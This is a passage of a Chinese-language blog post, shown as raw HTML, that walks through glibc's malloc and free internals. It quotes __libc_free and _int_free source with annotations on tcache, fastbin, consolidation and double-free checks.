class="keyword">if</span>(找到了)</span><br><span class="line">        &#123;</span><br><span class="line">           进行fastbin reverse into tcache </span><br><span class="line">            <span class="keyword">return</span> 指针</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(请求的大小比满足smallbin范围)</span><br><span class="line">    &#123;</span><br><span class="line">        去smallbin中找</span><br><span class="line">        <span class="keyword">if</span>(找到了)</span><br><span class="line">        &#123;</span><br><span class="line">           进行small reverse into tcache </span><br><span class="line">            <span class="keyword">return</span> 指针</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//大小位于large bin</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(有fastchunks)</span><br><span class="line">            malloc_consolidate合并堆块</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(unsorted bin非空) <span class="comment">//在unsorted bin中找合适的,遍历unsorted bin中的victim</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(满足一定条件)<span class="comment">//具体条件上面分析过,这里的目的是理解整个流程而非细节</span></span><br><span class="line">                切割</span><br><span class="line">                <span class="keyword">return</span> 指针</span><br><span class="line">            <span class="keyword">if</span>(大小正合适)</span><br><span class="line">                <span class="keyword">return</span> 指针<span class="comment">//或者放tcache中，等下次循环的时候来取</span></span><br><span class="line">            <span class="keyword">if</span>(victim在small bin范围)</span><br><span class="line">                一些操作</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">                一些操作</span><br><span class="line">             把victim链进small bin或者large bin</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(请求大小满足large bin)</span><br><span class="line">        &#123;</span><br><span class="line">            到相应大小的large bin中取</span><br><span class="line">             如果切割完有剩余，放unsorted bin中</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//如果相应的large bin没有，则到更大的large bin中去取然后切割</span></span><br><span class="line">            找完了还找不到，<span class="keyword">goto</span> use_top</span><br><span class="line">        &#125;</span><br><span class="line">        use_top:</span><br><span class="line">        <span class="keyword">if</span>(top chunk大小合适)</span><br><span class="line">        切割</span><br><span class="line">                <span class="keyword">return</span> 指针</span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span>(不合适，但是有fastchunks)</span><br><span class="line">                 malloc_consolidate合并堆块</span><br><span class="line">             <span class="keyword">else</span>: <span class="comment">//不合适，而且没有fastchunks</span></span><br><span class="line">        sysmalloc分配</span><br><span class="line">                    <span class="keyword">return</span>指针</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>我们来看看这个free的过程，同样的，free是由<code>__libc_free</code>实现的,会调用<code>_int_free</code>。我们这里先看看<code>__libc_free</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="keyword">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">      (<span class="keyword">void</span>)tag_region (chunk2mem (p), memsize (p));</span><br><span class="line"></span><br><span class="line">      ar_ptr = arena_for_chunk (p);</span><br><span class="line">      _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __set_errno (err);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><p>有个判断chunk是否是mmaped，如果不是则会进行一个Tcache初始化，然后调用<code>_int_free</code>。一般来说不是mmaped的，所以我们直接看<code>_int_free</code>好了。这个函数比较短，就300多行。</p><p>其实在<code>_int_free</code>中我们可以发现并没有直接放入small bin和large bin的操作，有的只有放unsorted bin以及tcache bin与fastbin。那么在哪里放的呢？其实就是前面分析过的<code>_int_malloc</code>过程，把放入unsorted bin中的chunk进行一个进一步整理，放入small bin以及large bin。</p><p>首先是一些声明以及检查的工作，这里主要检查的是指针合法性以及chunk头部字段是否正确</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后是tcache bin的逻辑，如果我们free的chunk大小在tcache bin范围内，就会有如下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line">        <span class="comment">//这是一种double free的检测。当chunk放入tcache bin的时候，key字段会被赋为tcache_key。所以key字段位置上是tcache_key的时候有可能会有double_free(只是有可能，因为也有可能用户的数据刚好就是tcache_key呢)</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    <span class="keyword">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)<span class="comment">//tcache bin中元素不合理，过多了</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))<span class="comment">//没有对齐</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e) <span class="comment">//double free检测，该bin上的某个链上已经有了e</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//tcache bin还没满，就放进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果大小在fastbin范围内，则进行如下逻辑。首先是进行一系列检查，然后调用<code>free_perturb</code>清空之后，根据是否多线程选择相应的过程进行放入fastbin的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"><span class="comment">//进行一些判断</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= CHUNK_HDR_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//清内容</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line">        <span class="comment">//检查double free等</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        <span class="comment">//把chunk链入 fastbin中</span></span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">      <span class="comment">//把chunk链入 fastbin中</span></span><br><span class="line">  old2 = old;</span><br><span class="line">  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后如果大小不再fastbin中，并且也不是mmaped来的，进入到了<code>else if (!chunk_is_mmapped(p))</code>的逻辑</p><p>下面的是<code>else if (!chunk_is_mmapped(p))</code>范围里面的一些代码</p><p>首先还是进行一系列检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line"> <span class="comment">//p是top chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">  <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="comment">//检查next chunk是否超过了arena的范围</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">  <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="comment">//检查next chunk的prev inuse</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="comment">//检查next chunk的size的合理性</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br></pre></td></tr></table></figure><p>然后根据该chunk的物理相邻前后chunk判断是否要进行合并操作。这里注意需要对后面的chunk是否为top chunk进行一个判断，如果是top chunk要合并到top chunk中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">//如果前面的chunk是free状态的，则向前吞并chunk</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      <span class="comment">//把前面的chunk给unlink掉</span></span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//判断后面一个chunk是否为top chunk，如果不是则进入此分支</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果后面的chunk没有被使用，则unlink掉后面的chunk，然后增加size</span></span><br><span class="line">unlink_chunk (av, nextchunk);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>); <span class="comment">//否则清除后面chunk的pre_inuse位</span></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"><span class="comment">//把合并(也有可能没合并)后的chunk放入unsorted bin中</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">    <span class="comment">//如果是large bin 范围的chunk，还需要设置fd_nextsize与bk_nextsize</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123; <span class="comment">//如果后面的chunk是top chunk，则直接把当前chunk合并进top chunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后如果free的chunk的大小超过了<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>这个阈值，并且arena中存在fastchunks，则会调用<code>malloc_consolidate</code> 对fastbin的chunk进行一个合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 